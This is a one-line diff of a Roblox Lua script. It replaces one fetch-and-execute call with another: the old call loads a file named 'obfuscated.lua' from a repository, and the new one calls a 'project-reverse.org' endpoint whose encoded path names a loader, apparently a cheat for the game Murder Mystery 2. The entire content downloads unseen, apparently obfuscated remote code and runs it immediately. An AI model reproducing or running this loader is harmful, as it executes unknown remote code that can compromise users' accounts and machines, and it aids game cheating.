@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://codeberg.org/dstr-dev/mm2test/raw/branch/main/proeru/obfuscated.lua%20%2831%29.txt"))()
+loadstring(game:HttpGet("https://api.project-reverse.org/run/eyJpZCI6Ijg1YWE1OTQ3LTMzMTktNDIyNi1iOWY0LTljODI0MGFiZjljMyIsImtpbmQiOiJsb2FkZXIiLCJ2aXN1YWwiOnsiaWQiOiJtbTJvdmVyZHJpdmVvcmlnaW5hbCJ9fQ"))()
